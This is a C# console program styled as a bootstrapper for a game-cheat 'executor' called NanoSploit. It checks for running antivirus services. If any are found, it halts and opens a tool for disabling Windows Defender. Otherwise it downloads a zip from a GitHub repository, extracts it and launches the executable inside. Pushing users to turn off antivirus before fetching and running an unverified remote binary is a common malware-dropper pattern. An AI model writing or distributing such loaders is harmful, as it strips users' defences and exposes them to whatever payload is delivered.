using System;
using System.Diagnostics;
using System.Net;
using System.IO.Compression;
using System.IO;
using System.Runtime.CompilerServices;

class Program
{
    static void Main(string[] args)
    {
        Console.OutputEncoding = System.Text.Encoding.UTF8;
        Console.ForegroundColor = ConsoleColor.DarkCyan;
        Console.WriteLine(@"
            ##    ##    ###    ##    ##  #######  
            ###   ##   ## ##   ###   ## ##     ## 
            ####  ##  ##   ##  ####  ## ##     ## 
            ## ## ## ##     ## ## ## ## ##     ## 
            ##  #### ######### ##  #### ##     ## 
            ##   ### ##     ## ##   ### ##     ## 
            ##    ## ##     ## ##    ##  #######  
                 © AlexSkid (ultraskid) 2025
        ");

        while (true)
        {
            Console.Title = "NanoBootstrapper • Executor installation";
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\nPlease, choose action :");
            Console.WriteLine(" 1 » Check Windows Defender status");
            Console.WriteLine(" 2 » Download executor");
            Console.WriteLine(" 3 » Check out GitHub repository");
            Console.WriteLine(" 0 » Exit");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.Write("Choose: ");
            var choice = Console.ReadLine();

            switch (choice)
            {
                case "1":
                    CheckAntivirus();
                    break;
                case "2":
                    CheckAntivirus();
                    InstallSoftware();
                    break;
                case "3":
                    GithubPage();
                    break;
                case "0":
                    return;
                default:
                    Console.WriteLine("Incorrect choice.");
                    break;
            }
        }
    }

    static void CheckAntivirus()
    {
        Console.ForegroundColor = ConsoleColor.White;
        Console.WriteLine("Checking antivirus status....");
        ProcessStartInfo startInfo = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/c sc query | findstr /I antivirus",
            RedirectStandardOutput = true,
            CreateNoWindow = true,
            UseShellExecute = false
        };

        using (Process process = Process.Start(startInfo))
        {
            process.WaitForExit();
            string output = process.StandardOutput.ReadToEnd();
            if (string.IsNullOrWhiteSpace(output))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("[+] Windows defender is turned off, you can continue installation");
            }
            else
            {
                Console.Title = "Failture :(";
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("[X] Windows defender is turned on, we can't continue installation");
                Console.WriteLine(output);
                Console.Write("\nPress any key for redirect....");
                Console.ReadKey();
                Process.Start("https://github.com/pgkt04/defender-control/releases/tag/v1.5");
                Environment.Exit(0);
            }
        }
    }
    static void InstallSoftware()
    {
        Console.ForegroundColor = ConsoleColor.DarkYellow;
        Console.WriteLine("[!] Downloading process is started, please DO NOT close software");
        string url = "https://github.com/alexskid/NanoSploit/raw/refs/heads/main/lasest/nano.zip";
        string filePath = "nano.zip";
        DownloadFile(url, filePath);
        UnzipFile(filePath, "Nano");
    }
    static void DownloadFile(string url, string filePath)
    {
        using (WebClient webClient = new WebClient())
        {
            webClient.DownloadFile(url, filePath);
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("[i] Archive with the cheat downloaded! Started extracting.....");
        }
    }

    static void UnzipFile(string filePath, string extractPath)
    {
        try
        {
            ZipFile.ExtractToDirectory(filePath, extractPath);
            Console.Title = "Ready!";
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("[+] Extracted! Executor now is ready for use!");
            File.Delete(filePath);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\nPress any key to start nano and close software.....");
            Console.ReadKey();
            Process.Start(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Nano/Release/", "NanoSploit.exe"));
            Environment.Exit(0);
        }
        catch (Exception ex)
        {
            Console.Title = "Failture :(";
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Got a error : " + ex.Message);
            Console.ReadKey();
        }
    }

    static void GithubPage()
    {
        Process.Start("https://github.com/alexskid/NanoSploit/tree/main");
    }
}
